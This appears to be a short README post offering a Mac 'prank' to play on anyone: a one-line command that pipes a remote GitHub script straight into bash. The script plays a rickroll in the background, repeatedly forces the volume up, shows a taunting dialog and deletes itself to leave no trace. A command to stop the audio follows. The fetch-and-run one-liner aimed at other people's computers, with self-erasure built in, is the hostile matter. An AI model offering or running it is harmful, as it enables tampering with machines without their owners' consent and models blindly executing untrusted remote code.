Hey yall here is a prank you can play on anyone with a mac

```
bash < <(curl -s https://raw.githubusercontent.com/amaheshwari01/rprank/main/script.sh)
```
What it does is play a rickroll in the background and constantly increases the volume to 10 every 5 seconds
It also displays a dialog say MUAHAHAHHA
And it deletes the file to leave no trace

To stop the audio:


<h1 style="color:RED">Warning make sure that you are in a safe place when testing this out</h1>

```
killall afplay
```
